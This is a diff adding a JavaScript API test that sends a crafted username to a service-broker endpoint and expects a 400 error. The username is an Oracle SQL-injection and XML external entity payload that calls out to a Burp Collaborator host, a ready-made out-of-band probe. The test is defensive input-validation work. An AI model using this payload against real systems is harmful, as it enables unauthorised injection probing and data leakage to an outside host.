@@ -252,6 +252,24 @@ test("Test errors operation", function (tst) {
 			});
 	});
 
+	tst.test("Put (create) " + sid + " instance with crashing username", function (t) {
+		create.parameters.username = "(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % fuurp SYSTEM \"http://jvioxqcvwkox9kec57utwldsbjhblzonga9yy.burpcollab'||'orator.net/\">%fuurp;]>'),'/l') from dual)";
+		request
+			.put(baseUrl)
+			.set("Authorization", auth)
+			.set("Accept", "application/json")
+			.send(create)
+			.expect("Content-Type", /json/)
+			.expect(400)
+			.end(function(err, res){
+				t.equal(err, null);
+				create.parameters = {};
+				create.parameters.username = process.env.SAUCELABS_USERNAME;
+				create.parameters.key = process.env.SAUCELABS_KEY;
+	            t.end();
+			});
+	});
+
 	tst.test("Delete non existing service instance " + sid + "x", function (t) {
 		request
 			.delete(baseUrl + "x")
